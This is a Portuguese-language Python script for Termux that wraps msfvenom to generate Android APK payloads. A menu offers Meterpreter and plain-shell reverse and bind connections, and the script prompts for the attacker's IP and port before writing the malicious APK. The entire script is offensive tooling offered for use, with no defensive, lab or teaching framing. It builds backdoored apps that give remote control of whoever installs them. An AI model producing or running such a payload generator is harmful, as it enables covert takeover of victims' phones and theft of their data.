#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
 █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗        █████╗ ██████╗ ██╗  ██╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗      ██╔══██╗██╔══██╗██║ ██╔╝
███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║  ██║█████╗███████║██████╔╝█████╔╝ 
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║  ██║╚════╝██╔══██║██╔═══╝ ██╔═██╗ 
██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║██████╔╝      ██║  ██║██║     ██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
                              ⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀                               ⠀⠙⢷⣤⣤⣴⣶⣶⣦⣤⣤⡾⠋⠀⠀⠀⠀⠀
⠀⠀⠀                               ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
⠀⠀                               ⠀⠀⣼⣿⣿⣉⣹⣿⣿⣿⣿⣏⣉⣿⣿⣧⠀⠀⠀⠀
⠀                               ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
                               ⣠⣄⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡄⠀⣠⣄
                               ⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
                               ⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
                               ⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
                               ⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
                               ⠻⠟⠁⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠈⠻⠟
⠀⠀⠀⠀                               ⠉⠉⣿⣿⣿⡏⠉⠉⢹⣿⣿⣿⠉⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀                               ⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀                               ⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀                               ⠀⠈⠉⠉⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀
    """
    print(banner)

def show_menu():
    """Menu com payloads ÚNICOS - NADA REPETIDO"""
    print("\n" + "="*35)
    print("     PAYLOADS ANDROID")
    print("="*35)
    
    # CADA UM É COMPLETAMENTE DIFERENTE
    payloads = [
        "[1] Meterpreter Reverse TCP",
        "[2] Meterpreter Reverse HTTP", 
        "[3] Meterpreter Reverse HTTPS",
        "[4] Meterpreter Bind TCP",
        "[5] Shell Reverse TCP",
        "[6] Shell Bind TCP"
    ]
    
    for payload in payloads:
        print(payload)
    
    print("\n[0] Sair")
    print("="*35)

def get_payload_config(payload_type):
    """Configuração do payload"""
    print(f"\nPayload {payload_type}")
    print("-" * 15)
    
    lhost = input("Seu IP: ").strip()
    lport = input("Porta [4444]: ").strip() or "4444"
    output_name = f"payload_{payload_type}.apk"
    
    return lhost, lport, output_name

def generate_payload(payload_type, lhost, lport, output_name):
    """Gera payload - ZERO REPETIÇÕES"""
    
    # CADA PAYLOAD É DIFERENTE
    payload_configs = {
        1: 'android/meterpreter/reverse_tcp',
        2: 'android/meterpreter/reverse_http', 
        3: 'android/meterpreter/reverse_https',
        4: 'android/meterpreter/bind_tcp',
        5: 'android/shell/reverse_tcp',
        6: 'android/shell/bind_tcp'
    }
    
    payload_name = payload_configs.get(payload_type)
    if not payload_name:
        return False
    
    print(f"\n🎯 Gerando {payload_name}...")
    
    try:
        cmd = [
            'msfvenom',
            '-p', payload_name,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', 'apk',
            '-o', output_name
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        if result.returncode == 0:
            print(f"✅ Sucesso: {output_name}")
            return True
        else:
            print("❌ Erro")
            return False
            
    except Exception as e:
        print(f"❌ Erro: {e}")
        return False

def main():
    """Função principal"""
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input("\nEscolha: ").strip()
            
            if choice == '0':
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 6:
                lhost, lport, output_name = get_payload_config(payload_type)
                
                if lhost:
                    success = generate_payload(payload_type, lhost, lport, output_name)
                    input("\nEnter para continuar...")
            
        except ValueError:
            print("❌ Opção inválida")
            input("Enter para continuar...")
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    main()
